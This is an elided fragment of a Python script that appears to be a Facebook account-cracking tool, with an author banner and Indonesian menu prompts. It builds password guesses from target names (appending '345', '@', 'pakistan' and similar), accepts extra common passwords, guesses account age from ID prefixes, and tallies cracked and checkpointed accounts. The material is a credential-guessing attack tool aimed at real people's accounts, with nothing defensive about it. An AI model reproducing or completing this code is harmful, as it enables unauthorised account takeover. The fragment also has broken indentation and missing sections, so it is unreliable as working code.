...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sCoded By %sShazi %s& %sBalochl\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/hurainawan0143\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sFacebook.com/AKUN.KERTASS\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sGithub.com/Shaziaiqbal143\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
def menu_log():
    ...
    for i in _cici_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
                ...
                _dapunta_.append(i+"345")
                _dapunta_.append(i+"@")
                _dapunta_.append(i+"@@")
                _dapunta_.append(i+"@@@")
               _dapunta_.append(i+"pakistan") 
               _dapunta_.append(i+"Pakistan")
               _dapunta_.append(i+"PAKISTAN")
            elif len(i)>=6:
                _dapunta_.append(i)
...
def tambah_pass():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456,12,1234,1122,786,789,345,786786'%(O,P,O,P))
...
def tahun(fx):
    if len(fx)==15:
        ...
        elif fx[:6] in ['100002','100003'] :tahunz = ' • 20112012'
        elif fx[:6] in ['100004']          :tahunz = ' • 2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' • 2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' • 2015'
        elif fx[:6] in ['100009']          :tahunz = ' • 2016'
...
class crack:
            ...
            if f=="":
                ...
                try:
                    ...
                    if put in ['']:
                        ...
                        print('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/n]'%(O,P,O,P))
                        puf = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
    ...
    def mbasic_opsi(self,fl):
        try:
            ...
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sMazzy:%s%s][%sFitty-Mu:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
        except:
            self.mbasic_opsi(fl)
    def free(self,fl):
        try:
